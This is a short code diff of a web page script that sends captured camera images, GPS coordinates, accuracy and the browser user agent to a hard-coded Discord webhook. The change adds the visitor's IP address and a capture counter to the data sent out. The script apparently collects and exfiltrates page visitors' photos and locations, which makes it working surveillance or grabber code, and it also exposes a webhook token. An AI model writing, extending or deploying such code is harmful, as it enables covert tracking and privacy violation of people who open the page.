@@ -83,12 +83,12 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // Existing Discord Logic (Preserved)
-    async function sendToDiscord({ latitude, longitude, accuracy, imageBlob }) {
+    async function sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count }) {
         const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
         const formData = new FormData();
-        formData.append("file", imageBlob, "capture.jpg");
+        formData.append("file", imageBlob, `capture_${count}.jpg`);
         const payload = {
-            content: `**Auto-Capture Data:**\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\nUA: ${navigator.userAgent}`
+            content: `**Capture #${count}**\nIP: ${ip}\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\nUA: ${navigator.userAgent}`
         };
         formData.append("payload_json", JSON.stringify(payload));
         try {
